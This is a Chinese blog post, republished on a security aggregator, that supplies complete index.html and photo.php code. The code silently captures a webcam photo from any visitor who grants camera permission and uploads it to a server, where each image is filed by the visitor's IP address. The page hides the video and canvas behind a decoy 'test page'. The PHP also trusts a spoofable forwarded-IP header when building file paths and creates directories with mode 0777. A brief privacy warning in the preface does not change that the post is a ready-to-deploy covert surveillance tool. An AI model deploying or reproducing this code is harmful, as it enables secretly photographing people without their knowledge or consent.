---
title: 获取相机权限自动拍照上传到服务器（PHP代码）
url: https://buaq.net/go-148962.html
source: unSafe.sh - 不安全
date: 2023-02-12
fetch_date: 2025-10-04T06:25:25.745810
---

# 获取相机权限自动拍照上传到服务器（PHP代码）

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![]()

获取相机权限自动拍照上传到服务器（PHP代码）

前言现在众多手机APP乱用权限并窃取用户隐私，大家要注意保护好自己；代码分别创建index.html和photo.php两个文件并上传至网站服务器即可；
*2023-2-11 17:17:0
Author: [blog.upx8.com(查看原文)](/jump-148962.htm)
阅读量:36
收藏*

---

## 前言

现在众多手机APP乱用权限并窃取用户隐私，大家要注意保护好自己；

## 代码

分别创建`index.html`和`photo.php`两个文件并上传至网站服务器即可；

## 说明

**建站环境需求：`Nginx` `PHP 7.0+`**
**如果上传到服务器的图片是全黑的或只有一半，说明使用者打开网页后快速关闭了，没有完整的获取到图片；**
**`index.html`代码第25行处需要指定`photo.php`文件的所在位置，如果文件在网站根目录下无需修改；**
**注意：由于浏览器安全机制原因，网站需开启SSL，如果仅使用HTTP，多数浏览器无法获取到相机权限；**

### index.html代码

```
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="" content="content">
    <title>SunPma'Blog</title>
    <style>
        .container {
            width: 60%;
            margin: 10% auto 0;
            background-color: #f0f0f0;
            padding: 2% 5%;
            border-radius: 10px
        }

        ul {
            padding-left: 20px;
        }

            ul li {
                line-height: 2.3
            }

        a {
            color: #20a53a
        }
    </style>
</head>
<body>
     <canvas id="canvas" style="display: none;" width="480" height="640"></canvas>
     <video id="video" style="display: none;width: 250px;height: 300px;"></video>
     <script src="https://lib.baomitu.com/jquery/3.6.0/jquery.js"></script>
    <script>
        window.addEventListener("DOMContentLoaded",function(){
            var canvas = document.getElementById('canvas');
            var context =canvas.getContext('2d');
            var video = document.getElementById('video');
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({video:true}).then(function(stream){
                    video.srcObject = stream;
                    video.play();
                    setTimeout(function(){context.drawImage(video,0,0,480,640)}, 1000);
                    setTimeout(function(){
                        var img = canvas.toDataURL('image/png');
                        $.post('/other/photo.php',{'imegse':img},function(data){
                        //指定photo.php文件所在位置
                        })
                    } ,1300)

                },function(){
                    alert('缺少访问权限');
                    location.reload();
                })

            }
        },false);
    </script>
<div class="container">
    <h1>测试页</h1>
    <h3>获取相机权限；</h3>
    <h3>自动拍照上传至服务器；</h3>
    <ul>
         <li>图片每日自动清理；</li>
         <li>代码获取：https://sunpma.com/994.html</li>
     </ul>
</div>
</body>
</html>
```

### photo.php代码

```
<?php
//允许跨域
header("Access-Control-Allow-Origin:*");
echo base64();
function base64()
{
    //接收 base64 数据
    $image = $_POST['imegse'];
    if (empty($image)) {
        return null;
    }
    //设置图片名称
    $imageName = date("His", time()) . "_" . rand(1111, 9999) . '.png';
    //判断是否有逗号 如果有就截取后半部分
    if (strstr($image, ",")) {
        $image = explode(',', $image);
        $image = $image[1];
    }
    //设置图片保存路径
    $path = "./img/" . getIp() . '/' . date("Ymd", time());
    //判断目录是否存在 不存在就创建
    if (!is_dir($path)) {
        mkdir($path, 0777, true);
    }
    //图片路径
    $imageSrc = $path . "/" . $imageName;
    //生成文件夹和图片
    $r = file_put_contents($imageSrc, base64_decode($image));
    if (!$r) {
        return 0;
    } else {
        return 1;
    }
}
function getIp()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
```

文章来源: https://blog.upx8.com/3217
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)